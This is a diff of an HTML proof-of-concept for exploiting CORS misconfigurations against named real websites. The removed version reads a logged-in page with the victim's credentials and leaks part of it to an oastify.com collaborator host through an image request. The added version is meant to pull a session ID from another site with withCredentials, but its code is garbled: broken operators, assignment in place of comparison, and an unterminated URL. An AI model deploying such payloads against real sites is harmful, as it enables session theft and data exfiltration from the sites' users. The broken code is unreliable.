@@ -1,21 +1,23 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>CORS PoC Logger</title>
-</head>
 <body>
-  <h1>CORS Misconfiguration PoC</h1>
-  <script>
-    fetch("https://mentor.duden.de/user/login_299792458", {
-      credentials: "include"
-    })
-    .then(response => response.text())
-    .then(data => {
-      // Extract something small (like first 50 chars) to send in URL
-      let snippet = encodeURIComponent(data.slice(0, 50));
-      new Image().src = "http://4fkbsbjdmex86vpscl3d15ijya43stgi.oastify.com/?leak=" + snippet;
-    })
-    .catch(err => console.error("Error:", err));
-  </script>
+<center>
+<h2>CORS POC Exploit<h2>
+<h3>Extract SID</h3>
+<div id="demo">
+<button type="button" onclick="cors()">Exploit Click here</button>
+</div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState = 4 86 this.status = 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+} ;
+xhttp. open("GET", "https://career.hms-networks.com/I, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
 </body>
 </html>
